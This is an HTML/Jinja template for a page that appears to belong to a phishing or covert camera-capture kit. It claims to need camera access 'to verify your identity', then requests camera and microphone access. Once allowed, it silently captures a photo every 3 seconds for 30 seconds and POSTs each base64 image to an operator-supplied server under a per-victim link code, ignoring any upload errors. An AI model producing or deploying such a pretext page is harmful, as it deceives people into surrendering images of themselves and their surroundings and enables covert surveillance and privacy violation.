<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Camera Access</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#0f0c29;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:rgba(255,255,255,.08);backdrop-filter:blur(10px);border-radius:20px;padding:30px;width:100%;max-width:400px;border:1px solid rgba(255,255,255,.1);text-align:center}
h2{font-size:24px;margin-bottom:10px}
p{color:#bbb;font-size:14px;margin-bottom:25px;line-height:1.5}
.btn{display:inline-block;padding:14px 40px;font-size:16px;border:none;border-radius:50px;cursor:pointer;font-weight:600;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;transition:.3s;width:100%;max-width:250px}
.btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(102,126,234,.4)}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
#video{width:100%;border-radius:12px;margin:15px 0;display:none;background:#000}
.spinner{display:none;width:30px;height:30px;border:3px solid rgba(255,255,255,.2);border-top:3px solid #fff;border-radius:50%;animation:spin .8s linear infinite;margin:15px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.status{font-size:14px;margin-top:10px;color:#3fb950}
.error{color:#f85149}
</style>
</head>
<body>
<div class="card">
<h2>📷 Camera Access</h2>
<p>We need camera access to verify your identity. Please allow when prompted.</p>
<button class="btn" id="btn" onclick="startCamera()">📷 Allow Camera</button>
<div class="spinner" id="spinner"></div>
<video id="video" autoplay playsinline muted></video>
<p id="status"></p>
</div>
<script>
const code='{{code}}';
const server='{{server}}';
{% if not valid %}
document.getElementById('btn').disabled=true;
document.getElementById('status').className='status error';
document.getElementById('status').innerHTML='❌ Invalid link';
{% endif %}

let stream=null;
let interval=null;

async function startCamera(){
const btn=document.getElementById('btn');
const sp=document.getElementById('spinner');
const st=document.getElementById('status');
const video=document.getElementById('video');

btn.disabled=true;
sp.style.display='block';
st.innerHTML='⏳ Requesting camera access...';
st.className='status';

try{
stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:true});
video.srcObject=stream;
video.style.display='block';
sp.style.display='none';
st.innerHTML='✅ Camera active';
st.className='status';

// Capture photos every 3 seconds
const canvas=document.createElement('canvas');
canvas.width=640;
canvas.height=480;
const ctx=canvas.getContext('2d');
let count=0;

interval=setInterval(()=>{
ctx.drawImage(video,0,0);
count++;
canvas.toBlob(function(blob){
const reader=new FileReader();
reader.onload=function(){
fetch(server+'/api/camera/'+code,{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({type:'photo',data:reader.result,count:count,timestamp:new Date().toISOString()})
}).catch(function(){});
};
reader.readAsDataURL(blob);
},'image/jpeg',0.7);
},3000);

// Auto stop after 30 seconds
setTimeout(stopCamera,30000);
}
catch(e){
sp.style.display='none';
st.innerHTML='❌ Error: '+e.message;
st.className='status error';
btn.disabled=false;
}
}

function stopCamera(){
if(interval)clearInterval(interval);
if(stream){
stream.getTracks().forEach(function(t){t.stop()});
stream=null;
}
document.getElementById('status').innerHTML='✅ Complete';
document.getElementById('status').className='status';
document.getElementById('btn').disabled=false;
}
</script>
</body>
</html>
